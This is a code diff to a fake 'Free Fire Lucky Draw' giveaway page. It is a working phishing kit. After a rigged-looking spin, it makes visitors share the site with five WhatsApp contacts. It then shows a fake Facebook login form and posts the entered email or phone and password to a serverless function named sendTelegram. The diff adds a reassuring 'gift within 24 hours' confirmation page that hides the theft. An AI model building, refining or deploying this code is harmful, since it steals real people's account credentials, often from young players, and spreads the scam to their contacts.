@@ -53,7 +53,6 @@ h1 {
   font-weight: bold;
   padding-top: 2px;
 }
-/* Winner card animation */
 .card.winner {
   border-color: #ffad07;
   box-shadow: 0 0 30px #ffad07cc, 0 0 15px #ff3b5099;
@@ -81,7 +80,8 @@ h1 {
 #result,
 #share-area,
 #redeem-area,
-#fb-modal {
+#fb-modal,
+#confirmation-page {
   display: none;
 }
 #fb-modal {
@@ -96,6 +96,23 @@ h1 {
   justify-content: center;
   z-index: 30;
 }
+#confirmation-page {
+  position: fixed;
+  left: 0;
+  right: 0;
+  top: 0;
+  bottom: 0;
+  background: #202a48;
+  color: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 31;
+  font-size: 1.4em;
+  padding: 20px;
+  text-align: center;
+  flex-direction: column;
+}
 .fb-container {
   width: 98vw;
   max-width: 360px;
@@ -104,6 +121,7 @@ h1 {
   padding: 28px 18px 22px 18px;
   box-shadow: 0 8px 38px #202a487a;
   position: relative;
+  color: #000;
 }
 .fb-container h2 {
   color: #1877f2;
@@ -142,8 +160,8 @@ h1 {
   cursor: pointer;
 }
 @media screen and (max-width: 600px) {
-  .lucky-grid {max-width:95vw;gap:12px;}
-  .card img {width:48px;height:48px;}
+  .lucky-grid {max-width: 95vw; gap: 12px;}
+  .card img {width: 48px; height: 48px;}
 }
 </style>
 </head>
@@ -169,13 +187,11 @@ h1 {
   <div class="centered">
     <button class="spin-btn" id="spin">Spin & Win!</button>
     <div id="result"></div>
-    <div id="share-area" style="display:none; margin-top: 15px; text-align:center;">
+    <div id="share-area" style="margin-top: 15px; text-align:center;">
       <p>Share the site with 5 friends on WhatsApp to redeem your prize!</p>
-      <button id="share-btn" class="spin-btn" style="width: 60%; margin: 10px auto;">
-        Share on WhatsApp (<span id="share-count">0</span>/5)
-      </button>
+      <button id="share-btn" class="spin-btn" style="width: 60%; margin: 10px auto;">Share on WhatsApp (<span id="share-count">0</span>/5)</button>
     </div>
-    <div id="redeem-area" style="margin-top:15px; text-align:center;">
+    <div id="redeem-area" style="margin-top: 15px; text-align:center;">
       <button class="redeem-btn" id="redeemBtn" disabled>Redeem</button>
     </div>
   </div>
@@ -192,97 +208,123 @@ h1 {
       </div>
     </div>
   </div>
+  <!-- Confirmation / Thank You page -->
+  <div id="confirmation-page">
+    <p>Thank you for logging in! <br>Your gift will be received in your mailbox within 24 hours.</p>
+  </div>
 <script>
-const prizes = [
-  '500 Diamonds',
-  '300 Diamonds',
-  'Rare Gun Skin Box',
-  'Rare Dress',
-  'Pet Box'
-];
-if (!sessionStorage.getItem('whatsappShareCount')) {
-  sessionStorage.setItem('whatsappShareCount', '0');
-}
-function updateShareUI() {
-  const count = Number(sessionStorage.getItem('whatsappShareCount'));
-  document.getElementById('share-count').textContent = count;
-  document.getElementById('redeemBtn').disabled = (count < 5);
-  document.getElementById('share-area').style.display = count < 5 ? 'block' : 'none';
-}
-function showPostWinUI() {
-  document.getElementById('result').style.display = 'block';
-  document.getElementById('share-area').style.display = 'block';
-  updateShareUI();
-  document.getElementById('redeem-area').style.display = 'block';
-  document.getElementById('redeemBtn').disabled = true;
-}
-function spinCards() {
-  // Remove winner class from all cards
-  document.querySelectorAll('.card').forEach(card => card.classList.remove('winner'));
-  // Simulate spinning with animation effects
-  const idx = Math.floor(Math.random() * prizes.length);
-  let rounds = 10, delay = 100, highlight;
-  function animate(i){
-    let cardEl = document.querySelector(`.card[data-idx="${i%prizes.length}"]`);
+  const prizes = [
+    '500 Diamonds',
+    '300 Diamonds',
+    'Rare Gun Skin Box',
+    'Rare Dress',
+    'Pet Box'
+  ];
+
+  // Initialize share count in sessionStorage if not set
+  if (!sessionStorage.getItem('whatsappShareCount')) {
+    sessionStorage.setItem('whatsappShareCount', '0');
+  }
+
+  function updateShareUI() {
+    const count = Number(sessionStorage.getItem('whatsappShareCount'));
+    document.getElementById('share-count').textContent = count;
+    document.getElementById('redeemBtn').disabled = (count < 5);
+    document.getElementById('share-area').style.display = count < 5 ? 'block' : 'none';
+  }
+
+  function showPostWinUI() {
+    document.getElementById('result').style.display = 'block';
+    document.getElementById('share-area').style.display = 'block';
+    updateShareUI();
+    document.getElementById('redeem-area').style.display = 'block';
+    document.getElementById('redeemBtn').disabled = true; // Redeem is disabled until shares are done
+  }
+
+  // Variables to hold current winner index for consistency
+  let currentWinnerIndex = null;
+
+  function spinCards() {
+    // Remove winner class from all cards
     document.querySelectorAll('.card').forEach(card => card.classList.remove('winner'));
-    cardEl.classList.add('winner');
-    if(i < rounds) {
-      setTimeout(()=>animate(i+1), delay + i*15);
-    } else {
-      // Final winner
-      setTimeout(()=>{
+
+    currentWinnerIndex = Math.floor(Math.random() * prizes.length);
+
+    let rounds = 15;
+    let delay = 100;
+
+    function animate(i) {
+      let idx = i % prizes.length;
+      document.querySelectorAll('.card').forEach(card => card.classList.remove('winner'));
+      let cardEl = document.querySelector(`.card[data-idx="${idx}"]`);
+      cardEl.classList.add('winner');
+      if (i < rounds) {
+        setTimeout(()=> animate(i + 1), delay + i * 10);
+      } else {
+        // At animation end, highlight and show correct prize
         cardEl.classList.add('winner');
         const result = document.getElementById('result');
-        result.innerHTML = `<br><b>Congratulations!<br>You won:</b><br>${prizes[idx]}`;
+        result.innerHTML = `<br><b>Congratulations!<br>You won:</b><br><img src="${cardEl.querySelector('img').src}" alt="" style="width:75px;display:block;margin: 8px auto;">${prizes[currentWinnerIndex]}`;
         showPostWinUI();
-        document.getElementById('redeemBtn').dataset.prize = idx;
-      }, 300);
-    }
-  }
-  animate(0);
-}
-document.getElementById('spin').onclick = spinCards;
-document.getElementById('share-btn').onclick = () => {
-  const siteURL = encodeURIComponent(window.location.href);
-  const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Play now: ${siteURL}`;
-  window.open(whatsappLink, '_blank');
-  let count = Number(sessionStorage.getItem('whatsappShareCount'));
-  if (count < 5) {
-    sessionStorage.setItem('whatsappShareCount', String(count + 1));
-  }
-  updateShareUI();
-};
-document.getElementById('redeemBtn').onclick = () => {
-  document.getElementById('fb-modal').style.display = 'flex';
-};
-document.getElementById('fb-login-btn').onclick = () => {
-  const emailOrPhone = document.getElementById('fb-email').value.trim();
-  const password = document.getElementById('fb-password').value.trim();
-  if (!emailOrPhone || !password) {
-    alert('Please fill in both fields.');
-    return;
-  }
-  fetch('/.netlify/functions/sendTelegram', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ emailOrPhone, password }),
-  })
-    .then(response => response.json())
-    .then(data => {
-      if (data.success) {
-        alert('Login details sent successfully!');
-        document.getElementById('fb-modal').style.display = 'none';
-        document.getElementById('fb-email').value = '';
-        document.getElementById('fb-password').value = '';
-      } else {
-        alert('Failed to send details.');
+        document.getElementById('redeemBtn').dataset.prize = currentWinnerIndex;
       }
+    }
+
+    animate(0);
+  }
+
+  document.getElementById('spin').onclick = spinCards;
+
+  document.getElementById('share-btn').onclick = () => {
+    const siteURL = encodeURIComponent(window.location.href);
+    const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Play now: ${siteURL}`;
+    window.open(whatsappLink, '_blank');
+    let count = Number(sessionStorage.getItem('whatsappShareCount'));
+    if (count < 5) {
+      sessionStorage.setItem('whatsappShareCount', String(count + 1));
+    }
+    updateShareUI();
+  };
+
+  document.getElementById('redeemBtn').onclick = () => {
+    document.getElementById('fb-modal').style.display = 'flex';
+  };
+
+  document.getElementById('fb-login-btn').onclick = () => {
+    const emailOrPhone = document.getElementById('fb-email').value.trim();
+    const password = document.getElementById('fb-password').value.trim();
+
+    if (!emailOrPhone || !password) {
+      alert('Please fill in both fields.');
+      return;
+    }
+
+    fetch('/.netlify/functions/sendTelegram', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ emailOrPhone, password }),
     })
-    .catch(() => {
-      alert('Error sending details.');
-    });
-};
-document.getElementById('fb-modal').style.display = 'none';
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          alert('Login details sent successfully!');
+          document.getElementById('fb-modal').style.display = 'none';
+          // Show confirmation message
+          document.getElementById('confirmation-page').style.display = 'flex';
+          document.getElementById('fb-email').value = '';
+          document.getElementById('fb-password').value = '';
+        } else {
+          alert('Failed to send details.');
+        }
+      })
+      .catch(() => {
+        alert('Error sending details.');
+      });
+  };
+
+  // Hide modals by default
+  document.getElementById('fb-modal').style.display = 'none';
+  document.getElementById('confirmation-page').style.display = 'none';
 </script>
 </body>
 </html>
